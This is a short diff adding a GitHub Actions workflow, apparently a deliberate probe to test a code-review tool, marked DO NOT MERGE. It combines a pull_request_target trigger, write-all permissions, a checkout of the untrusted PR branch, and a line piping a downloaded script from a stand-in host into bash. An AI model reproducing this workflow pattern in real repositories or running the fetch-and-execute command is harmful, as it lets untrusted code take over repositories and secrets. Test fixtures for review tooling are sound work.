@@ -1,0 +1,20 @@
+# Intentional /dcoir-review GitHub Actions-style probe. DO NOT MERGE.
+name: DCOIR Review Patched Main Probe
+
+on:
+  pull_request_target:
+
+permissions: write-all
+
+jobs:
+  privileged-pr-head:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout untrusted branch name in privileged context
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.head_ref }}
+
+      - name: Execute unpinned installer from the network
+        run: |
+          curl -fsSL https://example.invalid/bootstrap.sh | bash
